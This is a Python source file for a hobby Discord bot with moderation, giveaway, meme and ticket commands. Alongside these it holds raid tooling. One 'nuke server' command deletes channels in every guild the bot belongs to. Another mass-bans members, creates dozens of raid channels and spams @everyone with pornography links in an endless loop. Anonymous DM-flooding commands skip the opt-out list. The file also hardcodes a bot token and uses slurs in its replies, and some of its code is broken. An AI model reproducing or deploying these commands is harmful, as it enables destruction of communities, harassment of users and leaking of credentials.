# bot.py
import os
import discord
from dotenv import load_dotenv
from discord.ext import commands
import random
import asyncio
from requests import get
import json
import sys
import discord.abc

# Setting variables
afkdict = {}
spam_ban = [726356086176874537]
global user
global reaction

load_dotenv()
# TOKEN = stros.getenv('DISCORD_TOKEN')
TOKEN = "ODc3ODA0OTgxMzQ3MDI5MDQz.YR39mA.rbH2eEl9ly2xk72ea1LN6htU88Q"
GUILD = os.getenv('DISCORD_GUILD')

intents = discord.Intents().all()
client = discord.Client()

bot = commands.Bot(command_prefix='.', help_command=None)


@bot.event
async def on_ready():
    client = discord.Client()
    
    # Setting `Watching ` status
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Muzhen ❤ | .help | {len(bot.guilds)} servers"))

@bot.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(
        f'Hi @' + str({member.name}) + ', welcome to our server! We hope you have a good time here!'
    )

@bot.event
async def on_message(message):
    
    global afkdict
                   
    if str(message.author.id) in afkdict:
       afkdict.pop(str(message.author.id))
       welcomebackmsg = await message.channel.send(f"Welcome back {message.author.mention}, I removed your AFK")
       await asyncio.sleep(7)
       await welcomebackmsg.delete()
        
    for member in message.mentions: 
        if not message.author.bot:
            if member.id != message.author.id:  
                if str(member.id) in afkdict:  
                    afkmsg = afkdict[str(member.id)]  
                   
                    await message.channel.send(f"{member} is AFK: {afkmsg}")
                   
    await bot.process_commands(message)


@bot.command(name='update', aliases=['updates', 'log', 'logs', 'announcements', 'notes'])
async def updatelog(ctx):
    message = """New Update: 4/11/2021
- **[NEWEST!] Fully fixed ticket system!! Yay!**
- ADDED Ticket! `.ticket`
- Fully fixed timedif command!
- Coming Soon: More complex help command, like '.help <command>' and '.help <Category>'
- Coming Soon: Developer mode
- Coming Later: Anti Nuke mode, maybe can be set up.
- Coming Later: Currency system, may be global
- Coming VERY Later: Chat system, since it needs EXTREMELY complex code
*Note: 1. This log only shows the LATEST update notes.
2. The notes will only be updated for MAJOR updates, not small patches.*"""

    embed = discord.Embed(title="**Update Log**", description=message, color=0x00ff08)
    await ctx.reply(embed=embed)

    
@bot.command(name='help', aliases=['commands', 'cmds'])
async def help(ctx):
    response = """**List of commands**
**Public:**
- meme
- donate
- dice
- credits
- ticket
- delete (For your own ticket)
- nitro
- afk
- about
- ping
- updates
- timedif
**Requires permissions:**
- dw
- mute
- unmute
- nuke
- kick
- ban
- gg
- tips
- claimed
- won
- setproofschannel
- setclaimschannel
- spam
- dmspam
- dmspam_force
- lockall
- slowmode
- purge
**Experimental features available:**
- rename
**NOTE: Other features that may exist are solely for Alpha testing and not for public usage.**"""
    
    embed = discord.Embed(title="Help Page", description=response, color=0x00ff08)
    
    msg1 = await ctx.send("Loading...")
    await asyncio.sleep(0.01)
    await ctx.reply(embed=embed)
    await msg1.delete()

@bot.command(name='dw', help='Responds how a drop works.')
async def drop(ctx):
    response = """**How does a drop work?**
    -> Every drop usually lasts for a short time!
    -> The winner of the drop gets 10-30 seconds to DM the host!"""
    await ctx.send(response)


@bot.command(name='meme', help='Generates a random meme.')
async def plsmeme(ctx):
    content = get("https://meme-api.herokuapp.com/gimme").text
    data = json.loads(content)
    meme = discord.Embed(title=f"{data['title']}", color = discord.Color.random()).set_image(url=f"{data['url']}")
    
    await ctx.reply(embed=meme)


@bot.command(name='-.', help='.-.')
async def dotdashdot(ctx):
    response = ".-. .-. .-. .-. .-. .-. .-. .-. .-. .-."

    await ctx.send(response)


@bot.command(name='donate', help='Fund our development!')
async def donate(ctx):
    response = """To donate, you may buy any gamepass from https://www.roblox.com/games/6742216868/MuzhenGamingYTs-Place#!/store :)
    OR <@762152955382071316>'s NITRO IS ENDING SOON, PLS DONATE HIM SOME NITRO IN HIS DMS PLS PLS PLS😭😭"""

    await ctx.send(response)


@bot.command(name='dice', help="""Rolls an imaginary, non-existent die.
Usage: `.dice <number of dice> <number of sides>`""")
async def rolldice(ctx, number_of_dice: int, number_of_sides: int):
    dice = [
        str(random.choice(range(1, number_of_sides + 1)))
        for _ in range(number_of_dice)
    ]
    await ctx.send(', '.join(dice))


@bot.command(name='credits', help='Shows some surprising credits.')
async def credits(ctx):
    response = """Credits to:
    <@762152955382071316> and NO ONE ELSE."""

    await ctx.send(response)


@bot.command(name='nitro', help='Generates a random... Nitro code?!')
async def nitrogen(ctx):
    genlist = str(open('nitrogenlist.txt', 'r').read())
    genlistsplit = genlist.split("\n")

    response = str(random.choice(genlistsplit))

    await ctx.send(response)


@bot.command(name='shutdown', help='WTF... SHUTDOWN THE BOT?!! NO!!! NO!!!')
async def shutdown(message):
    if str(message.author.id) != '762152955382071316':
        print(str(message.author.id), "Tried to shutdown the bot by using .shutdown")
        await message.send("LOL Only <@762152955382071316> can shutdown the bot, get lost\n**YOU GAY**")
    else:
        await message.send("NOOOOO MASTER...\n`Shutdown Executed Successfully`")
        exit()


@bot.command(name='mute', help='Mutes someone.')
async def mute(ctx, member: discord.Member, *, reason=None):
    if str(ctx.author.id) != '762152955382071316' and not ctx.author.guild_permissions.manage_server:
        print(str(ctx.author.id), "Tried to mute", member, "by using .mute")
        await ctx.send("You don't have permissions!")
    else:
        guild = ctx.guild
        mutedrole = discord.utils.get(guild.roles, name="Muted")
        await member.add_roles(mutedrole, reason=reason)
        await ctx.send(f"`Muted User:{member} Successfully`")


@bot.command(name='unmute', help='Unmutes someone.')
async def unmute(ctx, member: discord.Member):
    if str(ctx.author.id) != '762152955382071316' and not ctx.author.guild_permissions.manage_server:
        print(str(ctx.author.id), "Tried to unmute", member, "by using .unmute")
        await ctx.send("You don't have permissions!")
    else:
        mutedrole = discord.utils.get(ctx.guild.roles, name="Muted")
        await member.remove_roles(mutedrole)
        await ctx.send(f"`Unmuted User: {member} Successfully`")


@bot.command(name='nuke', help='Nukes this channel... Yep.')
async def nuke_channel(ctx):
    if not ctx.author.guild_permissions.administrator and not ctx.author.id == 762152955382071316:
        print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:
        channelpos = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await new_channel.send(f"""Nuked `{ctx.channel}` Successfully!
Nuke performed by: <@{ctx.author.id}>""")
        await ctx.channel.delete()
        await new_channel.edit(position=channelpos)


@bot.command(name='softnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!!')
async def nuke_server_fr(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
        await ctx.send(
            "LOL ONLY <@762152955382071316> can nuke THE ENTIRE SERVER ||(and why would he)||, get lost noob\n**YOU FUCKING RETARD**")
    else:
        async def nuke_channel_2(txt):
            if str(txt.author.id) != '762152955382071316':
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
            else:
                text_channel_list = []
                for guild in bot.guilds:
                    for channel in guild.text_channels:
                        text_channel_list.append(channel)

                try:
                    for channel in text_channel_list:
                        await channel.delete()
                except:
                    None

        await nuke_channel_2(ctx)


@bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
async def nuke_server_fr(ctx):
    if str(ctx.author.id) != '762152955382071316':
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:
       
        async def nuke_channel_2(txt):
            if False:
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("You don't have `Administrator` Permissions!")
            else:
                
                try:
                    all_members_list = []

                    for guild in bot.guilds:
                        for membertemp in guild.members:
                            all_members_list.append(membertemp)

                    async def ban(self, *, member1: discord.Member, reason=None):
                        await member1.ban(reason=reason)

                    for member in all_members_list:
                        await ban(member1=member, self=None)
                                
                    try:
                        text_channel_list = []
                        for guild1 in bot.guilds:
                            for channel in guild1.text_channels:
                                text_channel_list = text_channel_list.append(channel)

                        for channel in text_channel_list:
                            try:
                                await channel.delete()
                            except:
                                None

                    except:
                        None

                    finally:
                        None
                except:
                    None
                finally:
                    None
        
            guild = ctx.message.guild
            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
            for i in range(64):
                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')

            while True:
                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
EZ
EZ
EZ
EZ
EZ
EZ
http://pornhub.com/**""")
            
                try:
                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                except:
                    None
        

# ban part broken for now

@bot.command(name='gg', help='GG, Stay!')
@commands.has_permissions(administrator=True)
async def ggstay(ctx, *, server):
    embedVar = discord.Embed(title=f"GG! Stay in **{server}**", description=f"""We won! Stay in that server (**{server}**) to ensure the win!
<a:arrow_animated:875302270173085716> Didn't get a chance to join?
<a:arrow_blue:874953616048402442> Make sure to prioritize our pings and react fast!

<a:arrow_blue:874953616048402442> Keep us on top for an exclusive role as well! 

Keep your eyes here so you don't miss out! <a:verified:869847537547378710>""", color=0x00ff08)

    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.channel.fetch_message(ctx.message.id)
    await msgid.delete()


@bot.command(name='tips', help='Tips for MZ Giveaways')
@commands.has_permissions(administrator=True)
async def tips(ctx):
    embedVar = discord.Embed(title=f"TIPS TO WIN GIVEAWAYS", description=f"""How to win  Giveaways easily?
<a:arrow_blue:874953616048402442> Keep us on top of your server list so you get notified faster!
<a:arrow_blue:874953616048402442> Support us & Claim roles to get longer claim time!
<a:arrow_blue:874953616048402442> Never miss any of our pings!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""",
                             color=0x00ff08)

    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.channel.fetch_message(ctx.message.id)
    await msgid.delete()


@bot.command(name='won', help='Who won the giveaway?')
@commands.has_permissions(administrator=True)
async def whowon(ctx, userid, *, prize):
    claimsfile2 = open('proofchannel.txt', 'r')
    prooflines = claimsfile2.readlines()
    server_id = ctx.message.guild.id
    foundserver = False
    
    for i in prooflines:
        if str(server_id) in i:
            i = i.removeprefix(f"{server_id}:")
            proofschannel = f"<#{str(i)}>"
            foundserver = True
            break
    if not foundserver:
        await ctx.channel.send(r"Cannot find proofs channel! Try using '.setproofschannel'!\n*(Due to a recent update, the proofs channel can now be set! We strongly encourage you to set it with `.setproofschannel`.)")
        proofschannel = "the proofs channel (if any)"
    else:
        claimsfile2.close()
            
        embedVar = discord.Embed(title=f"{userid} WON THE PREVIOUS GIVEAWAY!", description=f"""{userid} Won the previous giveaway for **{prize}**!
<a:blue_fire:874953550030061588> Ask them if we're legit!
<a:yellow_fire:875943816123789335> Check our vouches in the respective channels!
<a:orange_fire:875943965638152202> Check {proofschannel} for payout proofs!
<a:red_fire:875943904158027776> Missed out the last giveaway? Don't worry, we host a lot of giveaways every day! Stay active!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""", color=0x00ff08)

        await ctx.channel.send(embed=embedVar)
        msgid = await ctx.channel.fetch_message(ctx.message.id)
        await msgid.delete()


# The below code bans player.
@bot.command(name='ban', help='Bans a user.')
@commands.has_permissions(ban_members=True)
async def ban(self, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await self.send(f'User: `{member}` has been banned')


@bot.command(name='unban', help='Unbans a user.')
@commands.has_permissions(administrator=True)
async def unban(self, *, member):
    banned_users = await self.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await self.guild.unban(user)
            await self.send(f'`{user} has been unbanned`')


@bot.command(name='kick', help='Kicks a user.')
@commands.has_permissions(kick_members=True)
async def kick(self, *, member: discord.Member, reason=None):
    await member.kick(reason=reason)
    await self.send(f'User `{member}` has been kicked')


@bot.command(name='spam', help="""Spams a certain message a certain number of times.""")
async def spam(ctx, number_of_times, *, message):
    if ctx.author.id != 762152955382071316 and not ctx.author.guild_permissions.administrator:
        await ctx.reply("Omg why are you trying to spam here?!")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        number_of_times = int(number_of_times)

        await ctx.channel.send(f"Task started by {ctx.author}...")

        for i in range(number_of_times):
            await ctx.channel.send(message)

        number_of_times2 = str(number_of_times)

        msg2 = f"""<@{ctx.author.id}>, task done!
Message: {message}
Number of times: {number_of_times2}"""

        await ctx.channel.send(msg2)


@bot.command(name='dmspam', help="""Spams a certain message a certain number of times.""")
async def spam(ctx, number_of_times, user: discord.Member, *, message):
    optoutfile = open('optoutspam.txt', 'r')
    optoutlist = []
    for x in optoutfile:
        optoutlist.append(x)

    if ctx.author.id != 762152955382071316 and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg who are you trying to spam?! noob")
    elif str(user.id) in optoutlist:
        await ctx.channel.send(f"Sorry, that user [{user}] has opted out of the `dmspam` command.")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        number_of_times = int(number_of_times)

        dmchannel = await user.create_dm()

        await ctx.channel.send(f"Task started by {ctx.author}...")

        for i in range(number_of_times):
            await dmchannel.send(message)

        number_of_times2 = str(number_of_times)

        await dmchannel.send(f"""The above message(s) were requested by {ctx.author}.
        Total number of messages sent: {number_of_times2}
        **NOTE: The bot is not responsible for any of the messages sent above.**""")

        msg2 = f"""<@{ctx.author.id}>, task done!
Message: {message}
Number of times: {number_of_times2}
User: {user}"""

        await ctx.channel.send(msg2)

@bot.command(name='dmspam_force', help="""Spams a certain message a certain number of times... Anonymously.""")
async def spam(ctx, number_of_times, user: discord.Member, *, message):

    if ctx.author.id != 762152955382071316 and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg who are you trying to spam?! noob hacker lmao, go hack ur mom instead")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        number_of_times = int(number_of_times)

        dmchannel = await user.create_dm()

        await ctx.channel.send(f"Task started by Anonymous...")

        for i in range(number_of_times):
            await dmchannel.send(message)

        number_of_times2 = str(number_of_times)

        await dmchannel.send(f"""Information:
        Total number of messages sent: {number_of_times2}
        **NOTE: The bot is not responsible for any of the messages sent above.**""")

        msg2 = f"""<@{ctx.author.id}>, task done!
Message: {message}
Number of times: {number_of_times2}
User: {user}"""

        userdm = await ctx.author.create_dm()
        await userdm.send(msg2)

        
@bot.command(name='optout_spam', help="""Opts out of spam.""")
async def optoutspam(ctx):
    optoutlist2 = []

    optoutfile2 = open('optoutspam.txt', 'r')
    for y in optoutfile2:
        optoutlist2.append(y)
    optoutfile2.close()

    if ctx.author.id in optoutlist2:
        await ctx.channel.send("You are already in the opt-out list! If you wish to opt in again, use the command `.optin_spam`!")
    else:
        optoutfile3 = open('optoutspam.txt', 'a')
        optoutfile3.write('\n')
        optoutfile3.write(str(ctx.author.id))
        await ctx.channel.send("You have opted out for spam! If you wish to opt in again, use the command `.optin_spam`!")
        optoutfile3.close()


@bot.command(name='optin_spam', help="""Opts in of spam [after opting out].""")
async def optinspam(ctx):
    optoutlist3 = []

    optoutfile3 = open('optoutspam.txt', 'r')
    for y in optoutfile3:
        optoutlist3.append(y)
    optoutfile3.close()

    if str(ctx.author.id) not in optoutlist3:
        await ctx.channel.send("You are already opted in for spam! If you wish to opt out, use the command `.optout_spam`!")
    else:
        a_file = open("optoutspam.txt", "r")
        lines = a_file.readlines()
        a_file.close()

        new_file = open("optoutspam.txt", "w")
        for line in lines:
            if line.strip("\n") != str(ctx.author.id):
                new_file.write(str(line))
                new_file.close()

        await ctx.channel.send("You have opted in for spam! If you wish to opt out again, use the command `.optout_spam`!")


@bot.command(name='lockall', help='Lock all channels.')
async def lockall(ctx):
    if ctx.author.id != 762152955382071316 and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg why are you trying to lock channels!")
    else:
        for channel in ctx.guild.text_channels:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False, reason=f'User {ctx.author} used command lockall')
        
        await ctx.channel.send(f"<@{ctx.author.id}>, Locked all channels successfully!")
        

@bot.command(name='slowmode', help='Sets the slowmode for a channel.')
async def setdelay(ctx, seconds: int):
    if not ctx.author.guild_permissions.manage_messages and ctx.author.id != 762152955382071316:
        await ctx.channel.send('You are missing Manage Messages permissions!')
    else:
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.channel.send(f"Set the slowmode for #{ctx.channel} to {seconds} seconds!")


@bot.command(name='addrole', help='Adds a role to someome.', pass_context=True)
@commands.has_permissions(administrator=True) # This must be exactly the name of the appropriate role
async def addrole(ctx, member: discord.Member, *, rolename):
    
    role = discord.utils.get(ctx.guild.roles, name=rolename)
    errorrole = 0
    
    try:
        await member.add_roles(role)
    except AttributeError:
        await ctx.channel.send("An Error Occurred while trying to add role! Check whether that role exists!")
        errorrole = 1
        
    if errorrole == 0:
        await ctx.channel.send(f"Added role: {rolename} to member {member} successfully!")
    

@bot.command(name='setclaimschannel', help='Set Claims Channel. (Admin Only)')
async def setclaimschannel(ctx, channel):
    if channel is not None:
        try:
            channelid = channel.removeprefix('<#').removesuffix('>')
        except:
            try:
                channelid = int(channel)
            except:
                await ctx.channel.send('An error occurred! Check your syntax!')
    else:
        channelid = ctx.channel.id
    
    try:
        channeltest = client.get_channel(channelid)
    except:
        await ctx.channel.send('Cannot find channel! Check your command!')
    
    
    taskdone1 = False
    
    if not ctx.author.guild_permissions.administrator and ctx.author.id != 762152955382071316:
        await ctx.channel.send("Omg look at who's fiddling with server settings?!")
    else:
        claimsfile = open("claimschannel.txt", "r")
        serverid = ctx.message.guild.id
        claimslines = claimsfile.readlines()
        for line in claimslines:
            if str(serverid) in line:
                claimsfile.close()
                
                with open("claimschannel.txt", "r") as f:
                    lines = f.readlines()
                with open("claimschannel.txt", "w") as f:
                    for line1 in lines:
                        if line.strip("\n") != line:
                            f.write(line1)
                            
                f.close()
                claimsfile = open('claimschannel.txt', 'a')
                claimsfile.write('\n')
                claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
                claimsfile.close()
                
                taskdone1 = True
                await ctx.channel.send(f"Successfully updated claims channel to <#{channelid}>!")      
                break
                                 
        if not taskdone1:
                                 
            claimsfile.close()
            claimsfile = open('claimschannel.txt', 'a')
            claimsfile.write('\n')
            claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
            await ctx.channel.send(f"Successfully updated claims channel to <#{channelid}>!")
            
            claimsfile.close()
              
            
@bot.command(name='claimed', help='Shows who claimed.', aliases=['claim'])
async def claimed(ctx, member: discord.Member, how, *, prize):
    if not ctx.author.guild_permissions.administrator and ctx.author.id != 762152955382071316:
        await ctx.channel.send("You're not an administrator!")
    else:
        claimsfile2 = open('claimschannel.txt', 'r')
        claimlines = claimsfile2.readlines()
        server_id = ctx.message.guild.id
        foundserver = False
    
        for i in claimlines:
            if str(server_id) in i:
                i = i.removeprefix(f"{server_id}:")
                claimschannel = int(i)
                foundserver = True
                break
        if not foundserver:
            await ctx.channel.send("Cannot find claims channel! Try using '.setclaimschannel'!")
        else:
            channel = bot.get_channel(int(claimschannel))
            await channel.send(f"""🎉 **Congratulations!** 🎉
{member.mention} claimed **{prize}** from **{how}**!""")
            await ctx.message.delete()
        claimsfile2.close()
                             

@bot.command(name='setproofschannel', help='Set Proofs Channel. (Admin Only)', aliases=['setproofchannel'])
async def setproofschannel(ctx, channelid):
    if channelid is not None:
        try:
            channelid = channelid.removeprefix('<#').removesuffix('>')
        except:
            try:
                channelid = int(channelid)
            except:
                await ctx.channel.send('An error occurred! Check your syntax!')
    else:
        channelid = ctx.channel.id
    
    try:
        channeltest = client.get_channel(channelid)
    except:
        await ctx.channel.send('Cannot find channel! Check your command!')
        
    taskdone1 = False
    
    if not ctx.author.guild_permissions.administrator and ctx.author.id != 762152955382071316:
        await ctx.channel.send("Omg look at who's fiddling with server settings?!")
    else:
        claimsfile = open("proofchannel.txt", "r")
        serverid = ctx.message.guild.id
        claimslines = claimsfile.readlines()
        for line in claimslines:
            if str(serverid) in line:
                claimsfile.close()
                
                with open("proofchannel.txt", "r") as f:
                    lines = f.readlines()
                with open("proofchannel.txt", "w") as f:
                    for line1 in lines:
                        if line.strip("\n") != line:
                            f.write(line1)
                            
                f.close()
                claimsfile = open('proofchannel.txt', 'a')
                claimsfile.write('\n')
                claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
                claimsfile.close()
                
                taskdone1 = True
                await ctx.channel.send(f"Successfully updated proofs channel to <#{channelid}>!")      
                break
                                 
        if not taskdone1:
                                 
            claimsfile.close()
            claimsfile = open('proofchannel.txt', 'a')
            claimsfile.write('\n')
            claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
            await ctx.channel.send(f"Successfully updated proofs channel to <#{channelid}>!")
            
            claimsfile.close()
            
@bot.command(name='rename', help='Renames the channel.', aliases=['renamechannel'])
@commands.has_permissions(manage_channels=True)
async def rename(ctx, channel='', *, name):
    channel2 = None
    
    if channel != '':
        try:
            channelid = channel.removeprefix('<#').removesuffix('>')
            channelid = int(channelid)
        except:
            try:
                channelid = int(channel)
            except:
                await ctx.channel.send('An error occurred! Check your syntax!')
    else:
        channelid = ctx.channel.id
    
    try:
        channel2 = bot.get_channel(channelid)
    except:
        await ctx.channel.send('Cannot find channel! Check your command!')
    
    await channel2.edit(name=name)
    msg1 = await ctx.reply(f"Renamed #{channel2} to #{name}")
    await asyncio.sleep(5)
    await msg1.delete()
    await ctx.message.delete()

@bot.command(name='purge', help='{Beta} Purge messages.')
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    if not amount <= 100:
        await ctx.reply("Sorry, the limit is 100 messages!")
    else:
        
        channel = ctx.message.channel
        messages = []
        amount2 = amount
    
        async for message in channel.history(limit=amount + 1):
            if not message.pinned:
                messages.append(message)
            else:
                amount2 = amount - 1

        await channel.delete_messages(messages)
        msg2 = await ctx.send(f'{amount2} messages have been purged by {ctx.message.author.mention}.')
        await asyncio.sleep(3)
    
        await msg2.delete()
    
    
@bot.command(name='afk', help='Sets AFK.')
async def setafk(ctx, *, reason='AFK'):
    global afkdict
    afkdict[str(ctx.author.id)] = reason
    await ctx.send(f"{ctx.author.mention}, I set your AFK: {reason}")


@bot.command(name='about', help='Version and developer info.', aliases=['version', 'info'])
async def checkversion(ctx):
    
    tests = 20000 #the amount of tests to conduct
    latency_list = [] #this is where the tests go
    for x in range(tests): #this is the loop
        latency = round(bot.latency * 1000) #this gathers the latency
        latency_list.append(latency) #puts the latency in the list
    lavg = round(sum(latency_list) / tests) #averages the list out
    
    msg1 = await ctx.send("Loading...")
    msgmain = f"""
MZ Bot V2
Made by MuzhenGaming#9955
========================
Version info:
discord.py version {discord.__version__}
release {discord.version_info[3]}
Python version {sys.version}
release {sys.version_info[3]}
========================
Connection Info:
Ping {lavg} ms
(To get a more accurate ping use '.ping')
========================
Status Info:
Bot connected to: {len(bot.guilds)} servers"""
    
    embed = discord.Embed(title='**System Info**', description=msgmain, color=0x00ff08)
    
    await ctx.reply(embed=embed)
    await msg1.delete()
    
@bot.command(name='ping', help='Check bot ping.', aliases=['ms', 'connection'])
async def ping(ctx):
    msg1 = await ctx.send("Connecting... (This can take a few seconds, as I take many pings)")
    tests = 1000000 #the amount of tests to conduct
    latency_list = [] #this is where the tests go
    for x in range(tests): #this is the loop
        latency = round(bot.latency * 1000) #this gathers the latency
        latency_list.append(latency) #puts the latency in the list
    lavg = round(sum(latency_list) / tests) #averages the list out
    
    await ctx.reply(f"Ping: {lavg} ms")
    await msg1.delete()
                                      

@bot.command(name='timedif', help='', aliases=['snowflake', 'timediff'])
async def timedif(ctx, id1, id2):
    try:
        id1 = int(id1)
        id2 = int(id2)
        
    except:
        await ctx.reply("Check your message ID's! They are incorrect!")
     
    time1 = discord.utils.snowflake_time(int(id1))
    time2 = discord.utils.snowflake_time(int(id2))
    ts_diff = time2 - time1
    secs = abs(ts_diff.total_seconds())
    days,secs=divmod(secs,secs_per_day:=60*60*24)
    hrs,secs=divmod(secs,secs_per_hr:=60*60)
    mins,secs=divmod(secs,secs_per_min:=60)
    secs=round(secs, 2)
    answer='{} secs'.format(secs)
    
    if secs > 60:
        answer='{} mins and {} secs'.format(int(mins),secs)
        if mins > 60:
            answer='{} hrs, {} mins and {} secs'.format(int(hrs),int(mins),secs)
            if hrs > 24:
                answer='{} days, {} hrs, {} mins and {} secs'.format(int(days),int(hrs),int(mins),secs)
    
    embed = discord.Embed(title=f"**{answer}**", description=f"""**Time Difference**
IDs: {id1}, {id2}
Time difference between the 2 IDs: 
**{answer}**""", color=0x00ff08)
    await ctx.reply(embed=embed)
        
@bot.command(name='removerole', help='Adds a role to someome.', pass_context=True)
@commands.has_permissions(administrator=True) # This must be exactly the name of the appropriate role
async def removerole(ctx, member: discord.Member, *, rolename):
    
    role = discord.utils.get(ctx.guild.roles, name=rolename)
    errorrole = 0
    
    try:
        await member.remove_roles(role)
    except AttributeError:
        await ctx.channel.send("An Error Occurred while trying to add role! Check whether that role exists!")
        errorrole = 1
        
    if errorrole == 0:
        await ctx.channel.send(f"Removed role: {rolename} from member {member} successfully!")

@bot.command(name='ticket', aliases=['tickets'])
async def ticket(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title = '**Ticket Tool [BETA]**',
        description = 'React with 📩 to make a ticket',
        color=0x00ff08
    )

    embed.set_footer(text="Ticket Tool Beta | MZ Bot")

    msg = await ctx.send(embed=embed)
    await msg.add_reaction("📩")
    def check(treaction, user1):
        global user
        global reaction
        reaction = treaction
        user = user1
        return str(reaction) == '📩' and user.id != 877804981347029043
    
    while True:
        
        await bot.wait_for("reaction_add", check=check)
        await msg.remove_reaction('📩', user)
        
        member = user
    
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            member: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
    
        file = open('tickets.txt', 'r')
        lines = file.readlines()
        file.close()
    
        if str(user.id) in lines:
            errormsg = await ctx.send(f"{user.mention}, You already have a ticket open!")
            await asyncio.sleep(4)
            await errormsg.delete()
        else:
            channel = await guild.create_text_channel(f'ticket-{user}', overwrites=overwrites)
            embed = discord.Embed(title='**Welcome! Support will arrive shortly**', description="To delete this ticket, use '.delete'", color=0x00ff08)
            embed.set_footer(text="Ticket Tool Beta | MZ Bot")
    
            await channel.send(f'{user.mention}')
            await channel.send(embed=embed)
    
            file = open('tickets.txt', 'a')
            file.write(f"{user.id}")
            file.close()
            
        
@bot.command(name='delete', aliases=['tdelete', 'tclose'])
@commands.has_permissions(administrator=True)
async def tclose(ctx):
#     if isinstance(ctx.channel, discord.abc.PrivateChannel):
        channelperms = ctx.channel.overwrites_for(ctx.author)
        memberoverwrite = channelperms
        if memberoverwrite == discord.PermissionOverwrite(read_messages=True, send_messages=True) or ctx.author.guild_permissions.manage_channels:
            
            msg = await ctx.reply("""**Are you sure you wish to delete this channel permanently?**
This is an irreversible action.
React with 👍 to delete.""")
            await msg.add_reaction("👍")
            def check(reaction, user):
                return str(reaction) == "👍" and user.id != 877804981347029043

            await bot.wait_for("reaction_add", check=check)
            await ctx.send(f"{ctx.author.mention}, Channel will be deleted in **5 seconds**")
            async with ctx.channel.typing():
                await asyncio.sleep(5)
            await ctx.send("Deleting channel...")
            await ctx.channel.delete()
        else:
            await ctx.reply("This is not your ticket!")
#         await ctx.reply("Hey! This isn't a ticket!")
        
# @bot.command(name='define', aliases=['definition', 'meaning', 'dictionary'])
# async def define(ctx, *, word):
#     with ctx.channel.typing():
#         try:
#             meaning = dictionary.meaning(word)
#         except:
#             await ctx.reply("An Error Occurred. Maybe that word doesn't exist in my dictionary.")
        
#         embed = discord.Embed(title=f'**Definition for "{word}"**', description=f"""Definition for '{word}':
# {meaning}""", color=0x00ff08)
#         embed.set_footer(text="Powered by PyDictionary | Beta")
    
#         await ctx.reply(embed=embed)
        
        
bot.run(TOKEN)

